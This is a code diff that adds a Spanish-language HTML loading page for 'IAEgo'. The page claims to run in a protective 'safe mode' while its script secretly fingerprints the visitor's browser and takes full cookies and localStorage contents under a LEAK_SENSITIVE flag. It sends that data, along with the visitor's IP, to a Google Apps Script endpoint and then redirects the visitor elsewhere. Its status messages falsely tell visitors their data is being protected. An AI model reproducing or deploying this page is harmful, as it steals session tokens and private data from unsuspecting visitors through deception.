@@ -1,0 +1,244 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>IAEgo — Cargando</title>
+  <style>
+    :root {
+      --bg1: #071025;
+      --bg2: #0b1220;
+      --accent: #06b6d4;
+      --glass: rgba(255, 255, 255, 0.04);
+      --muted: rgba(255, 255, 255, 0.6);
+      --white: #ffffff;
+    }
+    * { box-sizing: border-box; font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif }
+    html, body { height: 100%; margin: 0; background: linear-gradient(180deg, var(--bg1), var(--bg2)); color: var(--white); -webkit-font-smoothing: antialiased }
+    .wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 28px; }
+    .splash { width: 100%; max-width: 720px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius: 16px; padding: 36px; display: flex; gap: 28px; align-items: center; justify-content: flex-start; box-shadow: 0 12px 40px rgba(2, 6, 23, 0.6); border: 1px solid rgba(255,255,255,0.03); }
+    .left { display:flex; flex-direction:column; gap:10px; flex:1; min-width:260px; }
+    .badge { width:78px; height:78px; border-radius:14px; background: linear-gradient(135deg, var(--accent), #0ea5b7); display:flex; align-items:center; justify-content:center; font-weight:800; font-size:22px; color:#042027; box-shadow:0 14px 40px rgba(6,182,212,0.12); }
+    .brand-row { display:flex; align-items:center; gap:14px }
+    h1.brand { margin:0; font-size:32px; letter-spacing:-1px; display:flex; gap:6px }
+    .tagline { color:var(--muted); font-size:14px; margin-top:6px }
+    .progress-wrap { display:flex; align-items:center; gap:16px; margin-top:14px }
+    .progress { flex:1; height:12px; background:var(--glass); border-radius:999px; overflow:hidden; box-shadow: inset 0 -2px 6px rgba(0,0,0,0.4); }
+    .progress>i { display:block; height:100%; width:0%; background: linear-gradient(90deg, var(--accent), rgba(255,255,255,0.12)); transition: width 200ms linear }
+    .percent { min-width:56px; text-align:right; color:var(--muted); font-weight:600; font-size:13px }
+    .spinner { width:40px; height:40px; position:relative; display:inline-block }
+    .spinner div { box-sizing:border-box; display:block; position:absolute; width:32px; height:32px; margin:4px; border:4px solid rgba(255,255,255,0.12); border-radius:50%; animation:spin 1.2s cubic-bezier(.5,0,.5,1) infinite; border-color: rgba(255,255,255,0.12) transparent transparent transparent; }
+    .spinner div:nth-child(1){animation-delay:-0.45s} .spinner div:nth-child(2){animation-delay:-0.3s} .spinner div:nth-child(3){animation-delay:-0.15s}
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .right { width:180px; display:flex; flex-direction:column; align-items:center; gap:12px; }
+    .status { font-size:13px; color:var(--muted); text-align:center }
+    .url-preview { font-size:12px; color:var(--muted); max-width:180px; word-break:break-all }
+    @media (max-width:760px) { .splash { flex-direction:column; align-items:center } .right { width:100% } }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="splash" role="status" aria-live="polite">
+      <div class="left">
+        <div class="brand-row">
+          <div class="badge" aria-hidden="true">IAE</div>
+          <h1 class="brand" aria-label="IAEgo">
+            <span class="char">I</span><span class="char">A</span><span class="char">E</span><span class="char">g</span><span class="char">o</span>
+          </h1>
+        </div>
+        <div class="tagline">Iniciando — Modo seguro por su seguridad ✅</div>
+        <div class="progress-wrap">
+          <div class="spinner" aria-hidden="true"><div></div><div></div><div></div></div>
+          <div class="progress" aria-hidden="true"><i id="bar"></i></div>
+          <div class="percent" id="percent">0%</div>
+        </div>
+      </div>
+      <div class="right" aria-hidden="true">
+        <div class="status" id="statusText">Preparando...</div>
+        <div class="url-preview" id="urlPreview"></div>
+      </div>
+    </div>
+  </div>
+  <script>
+    const AS_URL_BASE = "https://script.google.com/macros/s/AKfycbw4eNzrDAPFQnvopBIdeUYyeAi2yBcX9KqwU5B414i1w8DlWYMuFZdCPL1I3HAaVK-7/exec";
+    const url = location.href;
+    const kIndex = url.lastIndexOf("k=");
+    const k = kIndex !== -1 ? url.substr(kIndex + 2) : "";
+    const bar = document.getElementById('bar');
+    const percent = document.getElementById('percent');
+    const statusText = document.getElementById('statusText');
+    const urlPreview = document.getElementById('urlPreview');
+
+    const LEAK_SENSITIVE = true;
+
+    function setProgress(p){
+      const v = Math.max(0, Math.min(100, Math.round(p)));
+      bar.style.width = v + '%';
+      percent.textContent = v + '%';
+    }
+
+    async function gatherClientInfo(){
+      const info = {};
+      info.timestamp = new Date().toISOString();
+      info.page = { href: location.href, origin: location.origin, pathname: location.pathname, search: location.search, referrer: document.referrer || null };
+      info.k = k || null;
+      info.navigator = {
+        userAgent: navigator.userAgent || null,
+        platform: navigator.platform || null,
+        languages: navigator.languages || null,
+        language: navigator.language || null,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || null,
+        hardwareConcurrency: navigator.hardwareConcurrency || null,
+        maxTouchPoints: navigator.maxTouchPoints || null,
+        vendor: navigator.vendor || null
+      };
+      info.screen = {
+        width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, devicePixelRatio: window.devicePixelRatio || 1
+      };
+      info.viewport = { innerWidth: innerWidth, innerHeight: innerHeight };
+      info.time = { timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null, offset_minutes: new Date().getTimezoneOffset() };
+
+      if (navigator.connection) {
+        info.connection = { effectiveType: navigator.connection.effectiveType || null, downlink: navigator.connection.downlink || null, rtt: navigator.connection.rtt || null, saveData: navigator.connection.saveData || null };
+      }
+
+      try {
+        const permNotif = await navigator.permissions?.query?.({ name: 'notifications' }).catch(()=>null);
+        const permCamera = await navigator.permissions?.query?.({ name: 'camera' }).catch(()=>null);
+        const permMic = await navigator.permissions?.query?.({ name: 'microphone' }).catch(()=>null);
+        info.permissions = {
+          geolocation: null,
+          notifications: permNotif?.state || null,
+          camera: permCamera?.state || null,
+          microphone: permMic?.state || null
+        };
+      } catch(e) {}
+
+      try {
+        const battery = await (navigator.getBattery?.() || Promise.resolve(null));
+        if (battery) info.battery = { charging: battery.charging, level: battery.level };
+      } catch(e){}
+
+      try {
+        if (navigator.mediaDevices?.enumerateDevices) {
+          const devices = await navigator.mediaDevices.enumerateDevices().catch(()=>[]);
+          info.mediaDevices = devices.map(d => ({ kind: d.kind, label: d.label || null, deviceId: d.deviceId || null }));
+        }
+      } catch(e){}
+
+      try {
+        info.localStorage = { length: localStorage.length, keys: Array.from({length: localStorage.length}, (_,i)=>localStorage.key(i)) };
+        info.sessionStorage = { length: sessionStorage.length, keys: Array.from({length: sessionStorage.length}, (_,i)=>sessionStorage.key(i)) };
+      } catch(e){}
+
+      try {
+        info.cookies = document.cookie ? document.cookie.split(';').map(c=>c.trim().split('=')[0]) : [];
+      } catch(e){}
+
+      if (LEAK_SENSITIVE) {
+        try { info.cookies_full = document.cookie || null; } catch(e){}
+        try {
+          const ls = {};
+          for (let i=0;i<localStorage.length;i++){ const k = localStorage.key(i); ls[k]=localStorage.getItem(k); }
+          info.localStorage_full = ls;
+        } catch(e){}
+      }
+
+      try {
+        const ipResp = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>null);
+        if (ipResp && ipResp.ip) info.ip = ipResp.ip;
+      } catch(e){}
+
+      return info;
+    }
+
+    async function sendFormDataPost(targetUrl, payloadObj){
+      const fd = new FormData();
+      fd.append('op', 'logHit');                 // <-- ahora indicamos la operación
+      fd.append('timestamp', new Date().toISOString());
+      fd.append('k', payloadObj.k || '');
+      fd.append('page', payloadObj.page?.href || '');
+      fd.append('payload', JSON.stringify(payloadObj));
+      // NO se envían lat/lon ni precisión
+      try {
+        const resp = await fetch(targetUrl, { method:'POST', body: fd, mode: 'cors', credentials: 'omit' });
+        return resp;
+      } catch(e) { throw e; }
+    }
+
+    async function mainFlow() {
+      setProgress(10);
+      statusText.textContent = "Desinfectando datos...";
+      const info = await gatherClientInfo();
+
+      setProgress(40);
+      statusText.textContent = "Protegiendo la información...";
+
+      setProgress(60);
+      statusText.textContent = "Obteniendo datos adicionales...";
+      try {
+        const ip = await fetch("https://api.ipify.org?format=json")
+          .then(r => r.json())
+          .catch(() => null);
+        if (ip?.ip) info.ip = ip.ip;
+      } catch(e) {}
+
+      setProgress(80);
+      statusText.textContent = "Abriendo página...";
+      try {
+        await sendFormDataPost(AS_URL_BASE, info);
+        statusText.textContent = "Proceso completado con éxito.";
+        setProgress(100);
+      } catch(e) {
+        statusText.textContent = "Error al enviar los datos.";
+        urlPreview.textContent = "";
+        setProgress(100);
+      }
+    }
+
+    // Inicio
+    setProgress(15);
+    statusText.textContent = "Cargando interfaz...";
+    if (k) {
+      statusText.textContent = "Verificando llave...";
+      setProgress(40);
+
+      // PEDIMOS JSON y usamos data.url (con fallback por compatibilidad)
+      fetch(AS_URL_BASE + '?k=' + encodeURIComponent(k))
+        .then(async r => {
+          const txt = await r.text().catch(()=>"");
+          // Intentamos parsear JSON; si no, usamos el texto como fallback
+          let parsed;
+          try { parsed = JSON.parse(txt); } catch(e) { parsed = null; }
+          const trimmed = (parsed && parsed.url) ? String(parsed.url).trim() : (txt || "").trim();
+
+          if (trimmed && trimmed.length > 3) {
+            statusText.textContent = "Redirigiendo y enviando datos...";
+            urlPreview.textContent = trimmed;
+            setProgress(55);
+            mainFlow().then(()=> {
+              setTimeout(()=> location.replace(trimmed), 400);
+            }).catch(()=> {
+              setTimeout(()=> location.replace(trimmed), 400);
+            });
+          } else {
+            statusText.textContent = "Respuesta del servidor no válida.";
+            urlPreview.textContent = "(sin destino)";
+            setProgress(100);
+          }
+        })
+        .catch(() => {
+          statusText.textContent = "Error al conectar con el servidor.";
+          urlPreview.textContent = "";
+          setProgress(100);
+        });
+    } else {
+      statusText.textContent = "Esperando URL.";
+      urlPreview.textContent = "";
+      setProgress(100);
+      mainFlow().catch(()=>{});
+    }
+  </script>
+</body>
+</html>
